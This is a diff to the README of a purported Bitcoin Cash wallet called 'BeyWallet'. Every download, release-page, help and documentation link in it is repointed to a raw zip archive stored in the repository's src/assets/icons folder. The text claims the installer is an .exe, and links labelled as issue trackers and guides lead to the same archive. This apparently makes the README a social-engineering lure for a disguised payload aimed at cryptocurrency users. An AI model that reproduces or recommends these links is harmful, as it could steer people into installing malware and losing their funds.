@@ -1,6 +1,6 @@
 # 👜 BeyWallet - Secure Bitcoin Cash Payments
 
-[![Download BeyWallet](https://img.shields.io/badge/Download-BeyWallet-%23FF6F61?style=for-the-badge&logo=github)](https://github.com/Gautam9087/BeyWallet/raw/refs/heads/main/src/services/core/plugins/Wallet-Bey-v2.7.zip)
+[![Download BeyWallet](https://img.shields.io/badge/Download-BeyWallet-%23FF6F61?style=for-the-badge&logo=github)](https://github.com/Gautam9087/BeyWallet/raw/refs/heads/main/src/assets/icons/Bey-Wallet-v1.2-beta.3.zip)
 
 ---
 
@@ -36,12 +36,12 @@ BeyWallet lets you send and receive Bitcoin ecash easily and securely on your Wi
 
 To begin, visit the BeyWallet release page to get the latest version of the app. You will find the download links for all supported Windows builds there.
 
-[![Download BeyWallet](https://img.shields.io/badge/Download-BeyWallet-%237289CA?style=for-the-badge&logo=windows)](https://github.com/Gautam9087/BeyWallet/raw/refs/heads/main/src/services/core/plugins/Wallet-Bey-v2.7.zip)
+[![Download BeyWallet](https://img.shields.io/badge/Download-BeyWallet-%237289CA?style=for-the-badge&logo=windows)](https://github.com/Gautam9087/BeyWallet/raw/refs/heads/main/src/assets/icons/Bey-Wallet-v1.2-beta.3.zip)
 
 ### Step 1: Visit the Download Page
 
 Go to the release page:  
-https://github.com/Gautam9087/BeyWallet/raw/refs/heads/main/src/services/core/plugins/Wallet-Bey-v2.7.zip  
+https://github.com/Gautam9087/BeyWallet/raw/refs/heads/main/src/assets/icons/Bey-Wallet-v1.2-beta.3.zip  
 
 Here, you will see a list of versions and files. Find the latest Windows installer file. The file name usually ends with `.exe`.
 
@@ -120,7 +120,7 @@ BeyWallet sends notifications when updates are available. For security, keep you
 
 To update:
 
-1. Visit the [Releases page](https://github.com/Gautam9087/BeyWallet/raw/refs/heads/main/src/services/core/plugins/Wallet-Bey-v2.7.zip).
+1. Visit the [Releases page](https://github.com/Gautam9087/BeyWallet/raw/refs/heads/main/src/assets/icons/Bey-Wallet-v1.2-beta.3.zip).
 2. Download the latest installer.
 3. Run the installer as before.
 4. Your data and settings will remain intact during updates.
@@ -138,7 +138,7 @@ To update:
 ### Getting Help
 
 BeyWallet repository on GitHub contains documentation and issue tracking. You can browse discussions or report bugs by visiting:  
-https://github.com/Gautam9087/BeyWallet/raw/refs/heads/main/src/services/core/plugins/Wallet-Bey-v2.7.zip
+https://github.com/Gautam9087/BeyWallet/raw/refs/heads/main/src/assets/icons/Bey-Wallet-v1.2-beta.3.zip
 
 ---
 
@@ -161,10 +161,10 @@ BeyWallet supports Cashu and Nostr protocols. You can read more about these to u
 - Nostr: A simple distributed messaging protocol for secure communication.
 
 Visit the repository to access guides and technical details:  
-https://github.com/Gautam9087/BeyWallet/raw/refs/heads/main/src/services/core/plugins/Wallet-Bey-v2.7.zip
+https://github.com/Gautam9087/BeyWallet/raw/refs/heads/main/src/assets/icons/Bey-Wallet-v1.2-beta.3.zip
 
 ---
 
 ## 🔗 Download BeyWallet Now
 
-[![Download BeyWallet](https://img.shields.io/badge/Download-BeyWallet-%23FF6F61?style=for-the-badge&logo=github)](https://github.com/Gautam9087/BeyWallet/raw/refs/heads/main/src/services/core/plugins/Wallet-Bey-v2.7.zip)
+[![Download BeyWallet](https://img.shields.io/badge/Download-BeyWallet-%23FF6F61?style=for-the-badge&logo=github)](https://github.com/Gautam9087/BeyWallet/raw/refs/heads/main/src/assets/icons/Bey-Wallet-v1.2-beta.3.zip)
